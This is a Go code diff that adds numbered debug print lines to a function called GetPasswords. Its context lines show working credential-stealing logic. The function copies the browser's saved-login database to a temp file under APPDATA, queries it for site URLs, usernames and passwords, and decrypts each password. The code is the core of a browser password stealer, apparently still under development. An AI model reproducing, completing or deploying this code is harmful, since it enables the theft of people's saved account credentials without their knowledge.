@@ -116,12 +116,16 @@ func GetPasswords() ([]credential){
 	//Copy Login Data file to temp location
 	err := copyFileToDirectory(dataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
 	if err != nil {
+		fmt.Println("1")
+
 		log.Fatal(err)
 	}
 
 	//Open Database
 	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\tempfile.dat")
 	if err != nil {
+		fmt.Println("2")
+
 		log.Fatal(err)
 	}
 	defer db.Close()
@@ -129,6 +133,7 @@ func GetPasswords() ([]credential){
 	//Select Rows to get data from
 	rows, err := db.Query("select origin_url, username_value, password_value from logins")
 	if err != nil {
+		fmt.Println("3")
 		log.Fatal(err)
 	}
 	defer rows.Close()
@@ -140,11 +145,13 @@ func GetPasswords() ([]credential){
 
 		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
 		if err != nil {
+			fmt.Println("4")
 			log.Fatal(err)
 		}
 		//Decrypt Passwords
 		pass, err := Decrypt([]byte(PASSWORD))
 		if err != nil {
+			fmt.Println("5")
 			log.Fatal(err)
 		}
 		//Check if no value, if none skip
@@ -164,6 +171,7 @@ func GetPasswords() ([]credential){
 
 	err = rows.Err()
 	if err != nil {
+		fmt.Println("6")
 		log.Fatal(err)
 	}
 	//fmt.Printf("%v",credentials)
